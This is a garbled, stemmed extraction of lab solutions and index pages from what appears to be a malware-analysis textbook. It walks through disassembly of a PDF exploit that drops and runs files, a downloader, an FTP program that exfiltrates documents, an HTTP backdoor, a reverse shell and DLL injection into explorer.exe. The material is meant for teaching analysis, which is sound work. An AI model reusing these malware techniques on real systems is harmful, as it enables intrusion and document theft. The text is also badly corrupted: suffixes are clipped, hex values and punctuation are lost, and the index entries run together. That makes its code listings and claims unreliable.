foo e mov dword ptr edi h exex extract file written disk use helper function weve name writebuffertodisk analysi show follow function prototyp stdcall void writebuffertodiskdword globalstructptr char buffptr dword btestowrit dword maskval char nameptr function xor byte input buffer valu provid maskval write decod buffer filenam given nameptr call writebuffertodisk exampl c use xor mask xa write file tempfooex filenam pass call createprocessa creat new process file written disk exampl c decod write launch first file c mov ebx ebph f lea eax ebph push eax output name push ah xor mask b push dword ptr ebxh file size e push dword ptr ebpch buffer ptr push ebx globalsptr call writebuffertodisk xor eax eax lea edi ebph f mov ecx h rep stosd lea edx ebph lpprocessinformationc push edx lea edx ebph lpstartupinfo push edx push eax push eax push eax push ffffffffh c push eax push eax e push eax f lea eax ebph push eax call dword ptr ebx createprocessa push dword ptr ebpch c call dword ptr ebxh globalfre shellcod repeat procedur exampl c second file store encod within malici pdf alloc space accord file size store offset xc within embed data adjust file pointer locat use file offset store offset x exampl c alloc space second file f xor edx edx mov ebx ebph push dword ptr ebxch file size push edx call dword ptr ebxh globalalloc b test eax eax jz short loc f mov ebph eax xor edx edx push edx push edx push dword ptr ebxh file offset push dword ptr ebp pdf file handl ac call dword ptr ebxh setfilepoint shellcod exampl c use temporari file path first file replac filenam barpdf call writebuffertodisk decod file content use mask valu xa write tempbarpdf exampl c read decod write second embed file af push dword ptr ebxch file size b push dword ptr ebph memori buffer b push dword ptr ebp pdf file handl b push dword ptr ebxh readfil bb call fileiowrapp c mov eax ebpch end temp path buffer c mov dword ptr eax eh bar c mov dword ptr eax h pdfx lea eax ebphd push eax output name push ah xor mask mov ebx ebph dc push dword ptr ebxch file size df push dword ptr ebph buffer ptr e push ebx global ptr e call writebuffertodisk final shellcod exampl c open pdf file wrote tempbarpdf use call shellexecutea pass command string open path pdf caus system open specifi file applic regist handl exampl c open second file exit e xor ecx ecx ea lea eax ebph scratch space shellexecut lpoper verb f mov dword ptr eax efh open f mov byte ptr eax fa push swshownorm swshownoactiv ff push ecx push ecx lea eax ebph output pdf filenam push eax lea eax ebph ptr open e push eax f push ecx call dword ptr ebxh shellexecutea loc call dword ptr ebxch getcurrentprocess push b push eax c call dword ptr ebx terminateprocess common malici media file contain legitim file extract open shellcod attempt avoid rais suspicion expect user simpli think delay due slow comput actual exploit launch new process open real file cover trackslab solut short answer function x take paramet pass refer object ecx repres pointer call urldownloadtofil use httpwwwpracticalmalwareanalysiscomcpphtml url program download file remot server store ctempdownloadex local system detail analysi short lab intend demonstr usag pointer bulk main method shown exampl c exampl c main method labex push call yapaxiz oper newuint add esp mov ebpvar eax mov eax ebpvar mov ebpvar eax mov ecx ebpvar c mov dword ptr ecx offset ahttpwwwpracti httpwwwpracticalmalwareanalysiscom mov ecx ebpvar call sub code exampl c begin call new oper tell us code creat object refer object return eax eventu store var var var move ecx indic pass pointer function call pointer url httpwwwpracticalmalwareanalysiscomcpphtml store begin object follow call function sub shown exampl c exampl c code list sub push ecx mov ebpvar ecx push lpbindstatuscallback push dword b push offset acempdownload ctempdownloadex mov eax ebpvar mov ecx eax push ecx lpcstr push lpunknown call urldownloadtofilea exampl c see pointer ecx access store var remaind code argument place stack call urldownloadtofilea obtain url use function call pointer access first data element store object access push onto stack recal main method first element store object url string httpwwwpracticalmalwareanalysiscomcpphtml main method return program finish executinglab solut short answer interest string ftppracticalmalwareanalysiscom home ftp client indic program may ftp client softwar import findfirstfil findnextfil indic program probabl search victim filesystem import internetopen internetconnect ftpsetcurrentdirectori ftpputfil tell us malwar may upload file victim machin remot ftp server object creat xd repres doc file one virtual function offset x upload file remot ftp server virtual function call x call one virtual function x x x malwar connect remot ftp server use highlevel api function could download set local ftp server redirect dn request server order fulli exercis malwar program search victim hard drive upload file doc pdf extens remot ftp server purpos implement virtual function call allow code execut differ upload function differ file type detail analysi first look program string two interest string home ftp client ftppracticalmalwareanalysiscom look import also see ftpputfil ftpsetcurrentdirectori taken whole string import strongli suggest program go connect ftp server next run program perform dynam analysi ftprelat string set ftp server malwar analysi machin use apatedn redirect dn request local machin run malwar see procmon malwar open file directori start c search directori subdirectori look procmon output see program mostli open directori individu file open file doc pdf extens code open doc pdf file also see call tcpsend tcprecv show connect local ftp server ftp server run log abl see connect made wont see file success upload let load program ida pro see go program main method rel short shown exampl c exampl c main method lab solut push ebp mov ebp esp sub esp h mov ebpwversionrequest h lea eax ebpwsadata push eax lpwsadata mov cx ebpwversionrequest push ecx wversionrequest call wsastartup mov ebpvar eax push h namelen e push offset name name call gethostnam push int push offset filenam c f call sub add esp xor eax eax mov esp ebp b pop ebp c retn h code start call wsastartup initi win network function next call gethostnam retriev hostnam victim hostnam store global variabl ida pro label name renam variabl localhostnam recogn use later code code call sub execut rest malwar examin sub see call findfirstfil run loop call findnextfil also call recurs recogn pattern program search thefilesystem middl loop see lot stringmanipul function strcat strlen strncmp find program search strncmp compar manipul string charact doc filenam end doc code exampl c execut exampl c object creation code file end doc found push db call yapaxiz oper newuint e add esp e mov ebpvarc eax e cmp ebpvarc f jz short loc f mov edx ebpvarc f mov dword ptr edx offset off fe mov eax ebpvarc mov dword ptr eax offset offdc mov ecx ebpvarc mov ebpvar ecx jmp short loc code creat new object repres file end doc found code first call new oper creat object start initi object object store varc two instruct write virtual function tabl object first offset first instruct useless us overwritten second mov instruct know offdc virtual function tabl written object immedi creation new oper look offdc see store pointer function sub well label function docobjectfunc analyz later see call filenam end doc code check see filenam end pdf creat differ type object differ virtual function tabl offset xd pdf object creat code jump xb xf locat execut doc object creat filenam end pdf doc creat anoth type object file type follow jump code path converg see code move object pointer var see code exampl c exampl c virtual function callf mov ecx ebpvar mov edx ebpvar mov ecx edx b mov eax ebpvar mov edx eax mov ecx ebpvar call dword ptr edx code refer object store var call first pointer virtual function pointer tabl code whether pdf doc object creat function call differ differ type object saw earlier code could creat one three differ object object pdf file well call pdfobject first function object virtual function tabl xd object doc file well call docobject first function virtual function tabl object xdc object file well call otherobject first function virtual function tabl object xe well first check function call pdf object navig virtual function tabl xd find function call start x see call internetopen initi internet connect call internetconnect establish ftp connect ftppracticalmalwareanalysiscom see chang current directori pdf upload current file remot server renam function pdfobjectuploadfil also look function docobject see execut nearli step except chang directori doc directori final look virtual function tabl otherobject find upload function otherobject x function littl conclud doc pdf file upload malwar malwar author implement virtual function allow code easili modifi extend order add support differ file type simpli implement new object chang part code object creat test code add directori name doc pdf ftp serverand allow anonym write access rerun malici code see upload everi pdf doc file victim comput directori name file victim hostnam id numberlab solut short answer sever string look like error messag error send http post error send http get error read respons tell us program use http get post command also see html path srvhtml puthtml hint file malwar attempt open sever ws import tell us program commun network import createprocess suggest program may launch anoth process function call xf take paramet string ecx contain pointer object know object contain function except object object later use paramet cxxthrowexcept function tell context function xf initi except object store string describ caus except six entri switch tabl implement six differ backdoor command noop sleep execut program download file upload file survey victim program implement backdoor use http command channel abil launch program download upload file collect inform victim machin detail analysi look program string see sever look like error messag shown exampl c exampl c abbrevi list string labex encod arg error beacon respons error caught except pollstatu poll error arg pars error error upload fileerror download file error conduct machin survey creat process fail fail gather victim inform config error caught except main socket connect error host lookup fail send data error error read respons error send http get error send http post error messag provid excel insight program function messag tell us malwar probabl follow use http post get command send beacon remot machin poll remot server reason probabl command execut upload file download file creat addit process conduct machin survey inform string guess program backdoor use http get post command command control look like program support upload file download file creat new process survey victim comput open program ida pro see main method call function xbe return function xbe contain main program flow call main start creat new object new oper call function new object configdat argument function shown exampl c exampl c object creat use main c push h c mov ebpvar ebx c call yapaxiz oper newuint cd mov ecx eax cf add esp c mov ebpvar ecx c cmp ecx ebx c mov byte ptr ebpvar cb jz short loccb cd push offset filenam configdat c call sube c mov esi eax ida pro label new oper return pointer new object eax pointer object move ecx use pointer function call tell us function sube member function class object creat well call object firstobject exampl c show use sube exampl c first function call firstobject ef mov esi ecx ef push h efe call yapaxiz oper newuint f add esp f mov esphvar eax fa test eax eax fc mov esphvar f jz short locf f mov ecx espharg fa push ecx fb mov ecx eax fd call sub sube first store pointer firstobject esi creat anoth new object well call secondobject call function secondobject need keep analyz determin purpos object look sub shown exampl c exampl c except creat thrown push offset filenam configdat e mov dword ptr esi offset offc mov byte ptr esich eh ab call dscreatefilea b mov edi eax b cmp edi ffffffffh b jnz short locd b push offset aconfigerror config error bd lea ecx espbchvarac c call subf c lea eax espbhvarac ca push offset unk cf push eax call cxxthrowexcept cxxthrowexceptionxx base call createfilea configdat filenam guess function read configur file disk renam setupconfig code exampl c tri open configdat file file open success jump taken remaind code exampl c skip shown file open success see string config error pass argument function xf function xf take string paramet also use ecx pointer refer object use pointer store stack varac later see object pass cxxthrowexcept function tell us function xf member function except object base context subf call assum function initi except string config error import recogn function call error string argument follow call cxxthrowexcept similar code consist error string pass function follow call cxxthrowexcept appear throughout program time see pattern conclud function initi except dont need wast time analyz function continu analyz function x realiz read data configur file configdat store secondobject conclud secondobject object store read configur inform renam configobject return sube see better determin firstobject use creat configobject object sube store bunch inform firstobject shown exampl c exampl c data store firstobject fa mov esi eax fc mov dword ptr esih offset aindexhtml indexhtml f mov dword ptr esih offset ainfohtml infohtml fa mov dword ptr esih offset aresponsehtml responsehtml f mov dword ptr esich offset agethtml gethtml f mov dword ptr esih offset aputhtml puthtml ff mov dword ptr esih offset asrvhtml srvhtml f mov dword ptr esih fh fd mov dword ptr esich h f mov eax esi first eax store firstobject formerli pointer configobject next see seri hardcod url path two hardcod integ thenth function return pointer firstobject still cant complet sure firstobject appear store program global data well renam object globaldataobject learn enough give better name finish analyz first function call main determin load configur inform file initi object store global data program analyz first function call return main remaind main shown exampl c exampl c beacon poll command main function cd mov ecx esi cf mov byte ptr ebpvar bl c call subf c mov edi dssleep cd loccd cd mov eax esi cf mov eax eaxh c lea eax eaxeax c lea eax eaxeax cb lea ecx eaxeax ce shl ecx c push ecx dwmillisecond c call edi sleep c mov ecx esi c call loc cb inc ebx cc jmp short loccd see function call subf outsid loop call sub sleep function insid infinit loop know program string could guess subf send beacon remot machin sub poll remot server well renam function maybebeacon maybepol see maybebeacon maybepol pass globaldataobject ecx pointer member function weve call globaldataobject base realiz well renam object mainobject first well analyz maybebeacon see creat anoth new object call subd shown exampl c exampl c first function call maybebeacon functionfc mov eax esi fca mov edx eaxh fd add eax h fd push edx hostshort fd push eax char fd call subd see ida pro label argument subd know use paramet import function later tell hostshort tell us use paramet network function hton valu paramet retriev mainobject store esi see esi dereferenc obtain pointer configobject store offset mainobject next hostshort retriev offset configobject char store within configobject offset x x x level indirect common c program c program valu would store global data offset label track ida pro c store offset object harder track order determin data push onto stack would need go back function initi configobject see store offset x x practic often easier use dynam analysi determin valu without access commandandcontrol server may need go back configobject look subd see call hton socket connect establish connect remot socket maybebeacon call subff contain code shown exampl c exampl c begin victim survey function c call dsgetcomputernamea test eax eax jnz short loc push offset aerrorconductin error conduct machin survey b lea ecx esphvarc f call sub lea eax espchvarc push offset unk push eax e call cxxthrowexcept cxxthrowexceptionxx see code function tri obtain computershostnam fail throw except error messag error conduct machin survey tell us function conduct survey victim machin remaind subff show malwar gather addit victim inform renam subff surveyvictim move next analyz function call maybebeacon call sube error messag see sube http post remot server maybebeacon call subb error messag see check beacon respons without go much detail tell maybebeacon fact beacon function expect specif beacon respons order program continu run return main check maybepol x function see first call subd analyz earlier know initi connect commandandcontrol server maybepol function call subcf send http get order retriev inform remot server call subb retriev server respons http get request see two block code rais except respons doesnt meet certain format criteria next come across switch statement six option shown exampl c exampl c switch statement insid maybepol function f mov al esi add eax h switch case cmp eax ja short locd default jmp dsoffceax switch jump valu use switch decis store esi valu store eax x subtract valu lower five none switch jump taken ensur valu x x repres ascii charact f x less valu use offset switch tabl ida pro recogn label switch tabl click offc take us six possibl locat need toanalyz well label case case analyz one time case call delet oper immedi return without actual anyth well renam casedonoth case call atoi pars string number call sleep function return well renam casesleep case string pars call createprocess well renam caseexecutecommand case call createfil write http respons receiv commandandcontrol server disk well renam casedownloadfil case also call createfil upload data file remot server use http post command well renam caseuploadfil case call getcomputernam getusernam getversionex getdefaultlcid togeth perform survey victim machin send result back commandandcontrol server overal backdoor program read configur file determin commandandcontrol server send beacon commandand control server implement sever differ function base respons commandandcontrol serverlab solut short answer run program without paramet exit immedi main function locat xc spot call main look function call accept integ two pointer paramet string oclex store stack program run payload without chang filenam execut patch jump instruct x nop instead name execut compar string jzmex call strncmp x function xc take one paramet contain socket creat remot host call createprocess take paramet cant tell ida pro list cant distinguish thing store stack thing use function call function document msdn alway take paramet detail analysi tri run program perform dynam analysi immedi exit open program tri find main method wont need latest version ida pro older version may need find main method begin analysi x entri point specifi pe header shown exampl c exampl c entri point labex sub rsp h call subf add rsp h jmp subd know main method take three paramet argc argv envp furthermor know argc bit valu argv envp bit valu function call take paramet know cant main method quickli check function see call function import dll know call main must jmp instruct follow jump scroll look function take three paramet pass mani function call without paramet eventu find call main method shown exampl c call take three paramet first bit valu repres int next two paramet bit valu repres pointer exampl c call main method labex f mov r csqwordb fa mov csqwordb r mov rdx csqwordb mov ecx csdwordb e call subc move main function earli main function see lot data move onto stack includ data shown exampl c exampl c ascii string load stack recogn ida pro mov byte ptr rbphvarch mov rbphvar ecfh mov rbphvarc h immedi notic number move onto stack repres ascii charact valu xe period hexadecim valu start mostli letter rightclick number ida pro show charact repres press r line chang display chang display ascii charact label properli ida pro code look like exampl c exampl c list l ascii charact label properli ida pro mov byte ptr rbphvarch mov rbphvar lco mov rbphvarc exethi view tell us code store string oclex stack rememb x x assembl littleendian ascii data repres bit number charact revers three mov instruct togeth store byte repres oclex stack recal labex wont run properli unless execut name oclex point tri renam file oclex run doesnt work need continu analyz code ida pro continu analysi see code call strrchr lab solut obtain execut filenam without lead directori path see encod function partial shown exampl c exampl c encod function b mov eax ececfh bd sub cl h c movsx ecx cl c imul ecx ecx c sub ecx c imul ecx cb sar edx ce mov eax edx shr eax fh add edx eax imul edx ah sub ecx edx encod function would tediou analyz note move see done encod string scroll littl call strncmp shown exampl c exampl c code compar filenam encod string take one two differ code path f lea rdx r char f lea rcx rbphvar char ff mov rd h sizet call strncmp test eax eax c jz short loc e e loce code xref mainaj e mov eax jmp locd scroll see two string compar discov first string name malwar execut second encod string base return valu strncmp either take jump whichcontinu interest code take jump prematur exit program order analyz program dynam need get continu run without exit prematur could patch jmp instruct order forc code continu execut even program name incorrect unfortun ollydbg work bit execut would need use hex editor edit byte manual instead patch code tri determin correct string renam process lab solut determin string malwar search use dynam analysi obtain encod valu execut name use windbg ollydbg support bit execut open program windbg set breakpoint call strncmp shown figur c figur c use windbg see string compar lab solut windbg output sometim bit verbos well focu command issu cant set breakpoint use bp strncmp windbg doesnt know locat strncmp howev ida pro use signatur find strncmp exampl c know call strncmp shown figur c use u instruct verifi instruct set breakpoint locat issu g go command breakpoint hit enter da rcx obtain string see string compar jzmex know get program run continu analyz see follow import call order wsastartup wsasocket gethostbynam hton connect without spend much effort analyz actual code tell function call program connect remot socket see anoth function call must analyz shown exampl c exampl c bit function call unclear number paramet bd mov rcx rbx c movdqa oword ptr rbphvar xmm c call sub rbx regist move rcx cant sure normal regist movement function paramet look back see store rbx discov store socket return wsasocket start analyz function x see valu use paramet createprocessa call createprocessa shown exampl c exampl c bit call createprocessa mov rspehhhandl rax mov rspehvar rax f mov rspehvar rax lea rax rspehhhandl xor rd rd lpthreadattribut c xor rd rd lpprocessattribut f mov rspehvara rax lea rax rspehvar xor ecx ecx lpapplicationnam b mov rspehvara rax xor eax eax mov rspehvar h mov rspehvarb rax f mov rspehvarb rax mov rspehvarc eax mov rspehvarc mov rspehvarc h b mov rspehvar rbx mov rspehvar rbx b mov rspehvar rbx call cscreateprocessa socket store rbx code shown list paramet move onto stack instead push onto stack make function call consider complic bit version move onto stack repres paramet createprocessa exampl move lpstartupinfo pass paramet createprocessa howev startupinfo structur store stack start var mov instruct seen valu move startupinfo structur happen store stack individu paramet createprocessa intermingl function paramet stack activ difficult tell mani paramet pass function look function call howev createprocessa document know take exactli paramet point weve reach end code weve learn malwar check see program jzmex creat revers shell remot comput enabl remot access machinelab solut short answer malwar contain resourc section x xdll x resourc contain embed pe file labex compil bit system shown pe header characterist field imagefilebitmachin flag set malwar attempt resolv call iswowprocess determin run x system x machin malwar drop x resourc disk inject explorerex x machin malwar drop two file x xdll resourc section disk launch execut bit process x system malwar drop labdll window system directori typic cwindowssystem x system malwar drop labxdll labxex window system directori bit process run wow directori cwindowssyswow x system malwar launch labxex bit process see pe header characterist field imagefilebitmachin flag set x x system malwar perform dll inject explorerex x system drop run bit binari inject bit dll bit run explorerex x system inject bit dll bit run explorerex detail analysi malwar labex except ad x compon good place begin analysi lab solut let start examin new string found binari followsiswowprocess labxdll xdll x x labxex labdll see coupl string refer x well string iswowprocess api call tell malwar run bit process bit machin also see three suspici filenam labdll labxdll labxex next look malwar peview shown figur c figur c peview show three differ resourc section see three differ resourc section x xdll x appear contain embed pe format file evidenc mz header do stub perform quick dynam analysi malwar x x system produc annoy popup like lab solut next move analysi ida pro find malwar use iswowprocess see labex begin code lab exe dynam resolv api function iter process list function resolv code deviat attempt dynam resolv iswowprocess function shown exampl c exampl c dynam resolv iswowprocess call f push offset aiswowprocess iswowprocess f push offset modulenam kernel fc mov ebpvar call ebx getmodulehandlea push eax hmodul call edi getprocaddress mov myiswowprocess eax test eax eax f jz short loc lea edx ebpvar push edx call dsgetcurrentprocess b push eax c call myiswowprocess malwar obtain handl kerneldl call getprocaddress order tri resolv iswowprocess succe load address function myiswowprocess test use determin malwar found iswowprocess function avail newer oss malwar resolut check first compat older system support iswowprocess next malwar get pid use getcurrentprocess call iswowprocess return true var process bit applic run wow base result iswowprocess check two code path malwar take x x well begin analysi x path x code path x code path first pass string labdll x sub base static analysi guess renam function extractresourc shown exampl c exampl c extractresourc call x paramet push offset alabdl labdll de push offset ax x e call extractresourc formerli sub examin extractresourc function see fact extract x resourc disk append second argument result getsystemdirectorya therebi extract x resourc cwindowssystemlabdl next malwar set sedebugprivileg call sub use api function openprocesstoken lookupprivilegevaluea adjusttokenprivileg explain use sedebugprivileg malwar call enumprocess loop process list look modul base name explorerex use strnicmp function final malwar perform dll inject labdll explorerexeus virtualallocex createremotethread method dll inject ident lab solut compar md hash labdll labdll see ident therefor conclud malwar oper lab solut run bit machin must investig x code path figur malwar oper differ bit machin x code path x code path begin call extractresourc function twice extract x xdll resourc disk shown exampl c exampl c resourc extract two binari run x f push offset alabxdl labxdll push offset axdll xdll mov eax edi b call extractresourc push offset alabxex labxex push offset ax x mov eax edi call extractresourc two binari extract file labxdll labxex place directori return getsystemdirectorya howev run malwar dynam bit system wont see binari cwindowssystem sinc labex bit binari run bit machin run wow system directori map cwindowssyswow find file bit machin next malwar launch labxex local machin use shellexecutea look pe header labxex see imagefilebitmachin flag set characterist field tell us binari compil run bit process order disassembl labxex ida pro need use x advanc version ida pro disassembl file see high level structur look like labex exampl labxex also start dynam resolv api function iter process list labxex deviat labex build string usinglstrcpya lstrcata seen exampl c exampl c build dll path string write remot process bf lea rdx string cwindowssyswow c lea rcx rsph buffer lpstring call cslstrcpya lea rdx alabxdl labxdll df lea rcx rsph buffer lpstring e call cslstrcata cf lea r rsph buffer lpbuffer mov rd h nsize da mov rdx rax lpbaseaddress dd mov rcx rsi hprocess e mov rsphvar e call cswriteprocessmemori string built match locat dll drop disk cwindowssyswowlabxdl result string contain local variabl buffer shown bold list buffer eventu pass writeprocessmemori regist r lpbuffer paramet luckili ida pro recogn ad comment paramet even though push instruct see dll string written memori like follow call createremotethread tell us binari also perform dll inject find string explorerex string list track crossrefer x shown exampl c exampl c code use queryfullprocessimagenamea look explorerex process fa call csqueryfullprocessimagenamea lea rdx aexplorerex explorerex lea rcx rsphvar c call sub code call within process iter loop result queryfullprocessimagenamea pass explorerex sub infer conclud sort string comparison function ida pro flirt librari didnt recogn malwar oper way x version inject explorerex howev bit version inject bit version ofexplor open labxdll advanc version ida pro see ident labdll compil xindex note digit index link index entri display section titl entri appear section multipl index marker unusu entri sever link section click link take directli place text marker appear symbol bang symbol take deeper look oper disassembl arithmet oper symbol nop sled oper disassembl arithmet oper oper disassembl arithmet oper editor tool malwar analysi bit applic wow window bit window bit bit rotaterightaddit hash use hash export name bit malwar bit malwar window bit window bit lab detail analysi clue function window bit window bit lab lab detail analysi solut detail analysi pipe symbol snort intrus detect snorta end window function name explor dynam link function depend walker absolut address rebas differ x architectur vs rel address ollydbg rebas abstract level x disassembl level abstract accept function berkeley compat socket server client side network import window function access token privileg escal accuraci vs expedi intrus detect snort activ window log userspac keylogg add encod algorithm identifi xor loop ida pro add instruct simpl instruct thwart stackfram analysi addcodexref function idc ad miss code crossrefer ida pro address space layout random aslr rebas address space load execut anoth processs detail analysi addressofnameordin array pars pe export data addressofnam array pars pe export data adjusttokenprivileg function privileg escal use sedebugprivileg import window function detail analysi administr privileg malwar launcher launcher adob reader find shellcod detail analysi cve critic vulner find shellcod overflow detail analysi ad altern data stream featur window registryadvanc encrypt standard ae short answer modifi base decod decrypt modifi base decod advapidl explor dynam link function depend walker potentialkeyloggerex unpack execut hash dump detail analysi short answer import potentialkeyloggerex unpack execut detail analysi short answer obtain handl hash dump advertis popup recov hidden file ae advanc encrypt standard short answer modifi base decod decrypt modifi base decod agobot queri io commun port airgap network malwar analysi virtual machin allocaprob function analyz dll alphabet encod shellcod decod detail analysi altern data stream ad featur window registri alu arithmet logic unit reverseengin amd architectur bit malwar analysi intel pentium abil support secur virtual machin monitor robin irvin bypass vmware artifact search logic oper x architectur arithmet antidebug antidebug lab detail analysi detail analysi beingdebug flag beingdebug flag processheap flag processheap flag ntglobalflag flag detail analysi queryperformancecount function queryperformancecount function gettickcount function check detail analysi defeat techniqu ntglobalflag flag lab lab detail analysi solut detail analysi ntglobalflag flag processheap flag phantom protect check beingdebug flag processheap flag processheap flag beingdebug flag time check detail analysi queryperformancecount function queryperformancecount function gettickcount function gettickcount function queryperformancecount function rdtsc function gettickcount function queryperformancecount queryperformancecount function antidisassembl antidisassembl antidisassembl understand anti disassembl understand antidisassembl linear disassembl flow orient disassembl flowori disassembl jump instruct constant condit jump instruct constant condit imposs disassembl imposs disassembl imposs disassembl imposs disassembl ad miss code crossrefer ida pro ad miss code crossrefer ida pro misus structur except handler thwart stackfram analysi lab antidebug web command web command web command short answer detail analysi detail analysi basic antidisassembl defeat disassembl algorithm understand antidisassembl understand antidisassembl linear disassembl flowori disassembl linear disassemblylinear disassembl understand antidisassembl fals condit branch jump instruct constant condit web command short answer detail analysi lab lab web command solut web command malwar awar debugg antidebug manual repair code detail analysi obscur flow control imposs disassembl imposs disassembl ad miss code crossrefer ida pro ad miss code crossrefer ida pro misus structur except handler ad miss code crossrefer ida pro ad miss code crossrefer ida pro function pointer problem imposs disassembl misus structur except handler misus structur except handler return pointer abus ad miss code crossrefer ida pro sign web command techniqu flowori disassembl flowori disassembl jump instruct constant condit imposs disassembl imposs disassembl imposs disassembl imposs disassembl jump instruct constant condit jump instruct constant condit jump instruct target flowori disassembl nope instruct ida pro imposs disassembl thwart stackfram analysi thwart stackfram analysi antivirtu machin antivm techniqu antivirtu machin techniqu antivirtu machin techniqu bypass vmware artifact search vulner instruct use red pill antivm techniqu use red pill antivm techniqu queri io commun port use scoopyng lab detail analysi short answer short answer short answer short answer search vulner instruct find antivm techniqu use string find use string search vulner instruct highlight antivm ida pro queri io commun port impact malwar analysi short answer lab lab short answer solut short answer process replac find antivm techniqu use string tweak set use scoopyng vmware artifact antivirtu machin techniqu vulner instruct bypass vmware artifact search vulner instruct use red pill antivm techniqu use red pill anti vm techniqu short answer pill techniqu use red pill antivm techniqu queri io commun port use red pill antivm techniqu red pill antivm techniqu vulner instruct antiviru program kernel patch kernel issu window vista window x version antiviru scan antiviru scan use first step antiviru signatur scan short answer anubi basic dynam analysi apatedn compar registri snapshot regshot basic dynam tool practic tool malwar analysi detail analysi detail analysi detail analysismalwar dn request detail analysi apc asynchron procedur call apc inject apc inject detour appinitdl identifi keylogg string list detail analysi detail analysi persist detail analysi applic access devic object driver kernel code argument malwar ollydbg debug detail analysi arithmet instruct simpl instruct arithmet logic unit alu reverseengin arithmet oper disassembl arithmet oper read memori disassembl disassembl arithmet oper windbg read memori array disassembl disassembl array arrow window ida pro graph mode art assembl languag hyde reverseengin ascii string find string detail analysi load stack detail analysi aslr address space layout random rebas aspack pecompact assembl code process replac process replac assembl languag level abstract disassembl arithmet oper find loop understand function call convent jump tabl see also c code construct assemblyfor loop find loop statement disassembl arithmet oper switch statement jump tabl loop understand function call convent assemblylevel debugg vs sourc level debug asynchron procedur call apc apc inject attachthreadinput function import window function attack indic malici activ opsec oper secur identifi investig activ indic malici activ safe investig onlin opsec oper secur atinfo structur use memori map locat dll autorun tool common registri function identifi keylogg string list tool malwar analysisb backdoor basic dynam analysi use malwar sandbox style download launcher combin dynam static analysi techniqu detail analysi detail analysi detail analysi detail analysi analyz dll commandlin option analysi backdoor analysi network analysi detail analysi analysi commandlin option analysi createprocess sleep function detail analysi evad detect combin dynam static analysi techniqu http revers network analysi implement analyz dll indic detail analysi read configur file detail analysi sandbox use malwar sandbox backup imag oper system malwar analysi virtual machin bad unknown bit execut file error insert int bang symbol take deeper look base address rebas find kerneldl memori short answer find peview short answer pe file window rebas kerneldl find assembl code find kerneldl memori base cipher simpl encod scheme transform data base identifi decod base detail analysi custom substitut cipher identifi decod base identifi decod transform data base base encod selfdecod detail analysi detail analysi detailedanalysi detail analysi network signatur decod detail analysi identifi url detail analysi pad detail analysi detail analysi python program decod string selfdecod static pattern within network signatur baseencod function detail analysi basenam detail analysi bcdedit kernel issu window vista window x version beacon hide plain sight attack use exist infrastructur detail analysi short answer detail analysi short answer detail analysi short answer detail analysi clientiniti attack use exist infrastructur determin gener detail analysi packet structur detail analysi request initi malwar run short answer send malwar short answer short answer string decod detail analysi beep driver view structur inform behavior malwar malwar behavior see malwar behavior beingdebug flag use window api check beingdebug flag detail analysi check use window api berkeley compat socket berkeley compat socket bfk dn logger get ip address domain inform bho browser helper object clsid iid use com objectsbigendian instruct binari data simpl encod scheme detail analysi baseencod convers simpl encod scheme static analysi detail analysi binari file option ida pro ida pro binari translat vmware kernel mode bypass vmware artifact search bind function berkeley compat socket server client side network import window function bindiff tool malwar analysi binnavi tool malwar analysi bitblaz basic dynam analysi bitblt function import window function blacklist ip address get ip address domain inform blink pointer find kerneldl memori block cryptographi algorithm decrypt ae blue screen window except thing go wrong boch debugg tool malwar analysi bookmark plugin ollydbg command line bootini file driver kernel code load driver botnet control rat botnet basic dynam analysi rat queri io commun port bp command windbg read memori branch x architectur stack layout breakpoint steppingov vs steppinginto paus execut breakpoint softwar execut breakpoint hardwar execut breakpoint breakpoint command line read memori set breakpoint selfdecod int scan int scan rebuild import tabl import reconstructor appli structur ida pro analyz labsi windbg lab solut lab solut selfdecod selfdecod defer set breakpoint analyz labsi windbg kernel activ appli structur ida pro hardwar vs softwar lab solut debugg steppingov vs steppinginto paus execut breakpoint softwar execut breakpoint hardwar execut breakpoint condit hardwar execut breakpoint hardwar execut softwar execut breakpoint softwar execut paus execut breakpoint ollydbg breakpoint command line rebuild import tabl import reconstructor commandlin set command line windbg read memori scan code int scan set int scan set stack lab solut bridg network adapt use malwar analysi machin browser helper object bho clsid iid use com object bruteforc xor encod xor bu iment command windbg search symbol analyz labsi windbgbu command windbg set breakpoint buffer malwar placement valu backdoor analysi bufferoverflow attack full hello world exampl burp suit tool malwar analysi buster sandbox analyz tool malwar analysi byte array initi find antivm techniqu use string bytecod level abstractionc c code construct assembl recogn c code construct assembl recogn c code construct assembl disassembl arithmet oper disassembl arithmet oper find loop find loop understand function call convent cdecl style style jump tabl jump tabl disassembl array identifi struct analyz link list travers question detail analysi arithmet oper disassembl disassembl arithmet oper array disassembl disassembl array function call convent cdecl global vs local variabl recogn c code construct assembl statement disassembl arithmet oper lab question detail analysi solut detail analysi link list travers analyz link list travers loop find loop find loop understand function call convent loop find loop loop understand function call convent structur identifi identifi struct switch statement style style jump tabl jump tabl style style jump tabl jump tabl jump tabl c program languag rep instruct use name constant recogn c code construct assembl process replac imposs disassembl function pointer imposs disassemblymain method offset x architectur rep instruct pseudocod process replac process replac standard librari ida pro catalog name constant use name constant c analysi c analysi c analysi objectori program pointer inherit function overrid inherit function overrid creat destroy object lab detail analysi lab lab detail analysi solut detail analysi objectori program c analysi objectori program pointer inherit function overrid inherit function overrid inherit function overrid overload mangl pointer pointer objectori program object creation destruct creat destroy object virtual vs nonvirtu function inherit function overrid caesar cipher goal analyz encod algorithm call instruct cdecl flowori disassembl tail jump rebuild import tabl import reconstructor repair import tabl manual shellcod analysi positionindepend code detail analysi find oep rebuild import tabl import reconstructor quick analysi detail analysi posit depend shellcod analysi target base dword pointer repair import tabl manual call memoryloc stack call stack trace ollydbg standard back trace callback type handlescal convent x architectur differ differ x architectur callnexthookex function local remot hook thread target import window function canva penetrationtest tool tweak set captur bat tool malwar analysi captur event monitor process monitor examin hook ollydbg network traffic examin hook ollydbg stop procmon monitor process monitor captur screen function detail analysi cbc cipher block chain decrypt ae cdecl call convent cdecl cell phone malwar ida pro central process unit cpu reverseengin creat new process x architectur reverseengin thread creat new process certopensystemstor function import window function cf carri flag gener regist cfb cipher feedback decrypt ae cff explor tool malwar analysi cfileread command use instrument gener decrypt chain encod algorithm simpl encod scheme checkremotedebuggerpres function window debugg detect import window function child class c inherit function overrid recogn vtablefunct parent class recogn vtabl chunk size depend entropi score search highentropi content cipher block chain cbc decrypt ae cipher feedback cfb decrypt ae cipher goal analyz encod algorithm goal analyz encod algorithm xor identifi xor loop ida pro simpl encod scheme base simpl encod scheme caesar cipher goal analyz encod algorithm encod scheme identifi xor loop ida pro xor cipher xor cisvcex detail analysi detail analysi peview origin trojan version detail analysi write shellcod detail analysi class identifi clsid compon object model detail analysi com function 